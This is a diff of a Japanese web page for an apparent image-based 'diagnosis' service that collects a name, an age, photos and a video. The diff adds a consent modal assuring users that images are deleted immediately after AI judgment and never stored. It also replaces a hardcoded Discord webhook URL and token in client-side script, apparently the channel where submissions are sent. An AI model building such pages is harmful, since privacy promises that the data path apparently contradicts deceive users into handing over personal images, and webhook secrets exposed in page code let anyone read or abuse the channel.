@@ -639,12 +639,30 @@
 
 </div>
 
+<!-- 注意文モーダル -->
+<div id="consent-modal" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.55); z-index:9999; align-items:center; justify-content:center; padding:16px;">
+  <div style="background:white; border-radius:20px; padding:28px 22px; max-width:500px; width:100%; max-height:90vh; overflow-y:auto; box-shadow:0 24px 60px rgba(0,0,0,0.25);">
+    <h3 style="font-size:1.05rem; color:#b45309; margin-bottom:14px; text-align:center;">📋 診断を始める前のご確認事項</h3>
+    <p style="font-size:0.87rem; color:#444; line-height:1.8; margin-bottom:12px;">より正確な診断を行うため、画像の送信をお願いしております。<br>お客様のプライバシーを守るため、以下の点をお約束いたします。</p>
+    <div style="background:#fff8e1; border:1px solid #ffc107; border-radius:12px; padding:14px 16px; font-size:0.85rem; color:#444; line-height:1.9; margin-bottom:16px;">
+      <p style="margin-bottom:10px;"><strong>1. データはすぐに削除されます</strong><br>送信いただいた画像は、AI判定のために安全なサーバーへ送られますが、判定完了後に即時削除されます。データが保存・蓄積されることはありません。</p>
+      <p style="margin-bottom:10px;"><strong>2. 判定以外の目的では使用しません</strong><br>画像データは、本診断の判定結果を出すためだけに使用いたします。</p>
+      <p style="margin-bottom:0;"><strong>3. 指定の画像をお願いいたします</strong><br>正しい診断結果をお届けするため、必ず「指定条件に合った画像」をお送りください。条件と異なる画像の場合、判定ができないことがございます。</p>
+    </div>
+    <label style="display:flex; align-items:center; gap:10px; cursor:pointer; font-weight:bold; color:#333; padding:12px; background:#f0fff4; border-radius:10px; border:1.5px solid #b2dfdb; margin-bottom:12px;">
+      <input type="checkbox" id="consent-checkbox" onchange="onConsentChange()" style="width:22px; height:22px; cursor:pointer; accent-color:#27ae60; flex-shrink:0;">
+      <span>上記に同意して進む</span>
+    </label>
+    <button onclick="closeConsentModal()" style="width:100%; padding:13px; background:white; color:#888; border:2px solid #e0e0e0; border-radius:12px; font-size:0.95rem; font-weight:bold; cursor:pointer;">同意しない</button>
+  </div>
+</div>
+
 <script>
   // ▼▼▼ Google Apps Script をデプロイ後、ウェブアプリURLをここに貼り付け ▼▼▼
   const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwOtR7nzexvwyU_oND54WrWiclQTpCT72fWGTPzjwErvE6eGyYBXlclH8mkAB3oT1hC7g/exec';
   // ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲
 
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1484170174100668506/smwL-fQjIqL0AClmgFDsuDC3J0TAogC1jDco0VSwhJqBy1msJ9pxCpeJP58yKkDsoYYM';
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1483068719780331591/HzuTzG8neJOC_yxz7GshVEouSCgo7MJvk-K5LOTeIcasrzUvswoypueZ-uc0hK2QfJ1p';
 
   let selectedImages = [null, null, null, null, null, null];
   let selectedVideo = null;
@@ -853,11 +871,26 @@
     else                               { document.getElementById('err-age').style.display = 'none'; }
     if (!ok) return;
 
-    document.getElementById('summary-box').innerHTML =
-      `<strong>お名前：</strong>${name}　／　<strong>年齢：</strong>${age}歳`;
-    updateStepUI(2);
-    showScreen('screen-step2');
-    window.scrollTo({ top: 0, behavior: 'smooth' });
+    document.getElementById('consent-checkbox').checked = false;
+    document.getElementById('consent-modal').style.display = 'flex';
+  }
+
+  function closeConsentModal() {
+    document.getElementById('consent-modal').style.display = 'none';
+    document.getElementById('consent-checkbox').checked = false;
+  }
+
+  function onConsentChange() {
+    if (document.getElementById('consent-checkbox').checked) {
+      document.getElementById('consent-modal').style.display = 'none';
+      const name = document.getElementById('input-name').value.trim();
+      const age  = parseInt(document.getElementById('input-age').value);
+      document.getElementById('summary-box').innerHTML =
+        `<strong>お名前：</strong>${name}　／　<strong>年齢：</strong>${age}歳`;
+      updateStepUI(2);
+      showScreen('screen-step2');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
   }
 
   function goToStep1() {
